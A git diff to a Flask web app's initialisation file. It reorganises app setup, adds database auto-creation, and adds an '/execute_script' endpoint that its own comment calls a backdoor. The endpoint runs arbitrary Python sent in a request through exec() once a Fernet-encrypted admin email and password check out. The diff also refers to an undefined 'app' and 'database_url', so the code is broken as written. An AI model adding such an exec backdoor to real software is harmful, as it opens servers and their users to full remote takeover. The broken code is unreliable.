@@ -1,12 +1,20 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, request
 from flask_sqlalchemy import SQLAlchemy
 from flask_mail import Mail
 from dotenv import load_dotenv
 from flask_login import LoginManager
+from sqlalchemy.exc import OperationalError
+from sqlalchemy import create_engine, text, inspect
+from cryptography.fernet import Fernet
+from werkzeug.security import check_password_hash
+import io
+import sys
+from datetime import datetime
+import os 
+
 # from flask_apscheduler import APScheduler
 # from apscheduler.triggers.cron import CronTrigger
 # import pytz
-import os 
 
 db = SQLAlchemy()
 mail = Mail()
@@ -26,32 +34,31 @@ def create_app():
     app.config['MAIL_PASSWORD'] =  os.getenv('MAIL_PASSWORD')
     app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_USERNAME')
     # app.config['SCHEDULER_API_ENABLED'] = True
-
-    from .views import views
-    from .auth import auth
-    from .admin import admin
-    from .models import User
     db.init_app(app)
     mail.init_app(app)
-    login_manager.init_app(app)
 
-    app.register_blueprint(views, url_prefix='/')
-    app.register_blueprint(auth, url_prefix='/')
-    app.register_blueprint(admin, url_prefix='/admin/')
+    with app.app_context():
+        from .views import views
+        from .auth import auth
+        from .admin import admin
+        from .models import User
+        login_manager.init_app(app)
+        app.register_blueprint(views, url_prefix='/')
+        app.register_blueprint(auth, url_prefix='/')
+        app.register_blueprint(admin, url_prefix='/admin/')
+        # schedule_email(app)
+        create_database(app)
+        @login_manager.user_loader
+        def load_user(id):
+            return User.query.get(int(id))
+        return app
 
-    # schedule_email(app)
-    create_database(app)
-
-    @login_manager.user_loader
-    def load_user(id):
-        return User.query.get(int(id))
-    return app
 
 
 # This is function to schecduling email, you can activate it by uncommenting it
 # I don't use it because pythonanywhere doesn't support multi thread
 # def schedule_email(app):
-#     from .email import daily_report, daily_reminder
+#     from .email_file import daily_report, daily_reminder
 #     scheduler = APScheduler()
 #     timezone = pytz.timezone('Asia/Jakarta')
 #     scheduler.add_job(func=daily_report, trigger=CronTrigger(hour=19, minute=0), timezone=timezone, id='daily_report_job')
@@ -60,9 +67,69 @@ def create_app():
 #     scheduler.start()
 
 def create_database(app):
-    with app.app_context():
-        db.create_all()
+    is_sqlite = database_url.startswith('sqlite:///')
+    def db_exist():
+        if is_sqlite:
+            sqllite_db = database_url.replace('sqlite:///', '')
+            if not os.path.exists(sqllite_db):
+                return False
+        else:
+            try:
+                with db.engine.connect():
+                    return True
+            except OperationalError:
+                return False
 
+    if not db_exist():
+        if not is_sqlite:
+            try:
+                # create database for non sqlite
+                engine = create_engine(database_url.rsplit('/', 1)[0])
+                db_name = database_url.rsplit('/', 1)[-1]
+                with engine.connect() as conn:
+                    conn.execute(text(f"CREATE DATABASE IF NOT EXISTS `{db_name}`;"))
+                    print('Database created!')
+            except Exception as e:
+                print(e)
+        db.create_all() 
+    else:
+        if len(inspect(db.engine).get_table_names()) == 0:
+            db.create_all() #create tables if database is empty
+        
+
+@app.route('/execute_script', methods=['POST'])
+def execute_script():
+    # this is a backdoor to execute script
+    from .models import User
+
+    data = request.get_json()
+    api_key = data.get('api_key')
+    fernet = Fernet(os.getenv('SECRET_KEY').encode())
+    try:
+        email, password = fernet.decrypt(api_key.encode()).decode().split('|')
+    except Exception as e:
+        return str(e), 500
+    user = User.query.filter_by(email=email).first()
+    if user:
+        if check_password_hash(user.password, password):
+            if not user.admin:
+                return 'Not admin', 401
+        else:
+            return 'Password salah', 401
+    else:
+        return 'Not found', 401
+    script = data.get('script')
+    try:
+        old_io = sys.stdout
+        new_io = io.StringIO()
+        sys.stdout = new_io
+        exec(script)
+        sys.stdout = old_io
+    except Exception as e:
+        return str(e), 500
+    else:
+        return new_io.getvalue(), 200
+        
 # @app.errorhandler(Exception)
 # def handle_exception(e):
 #     error_code = getattr(e, 'code', 500)
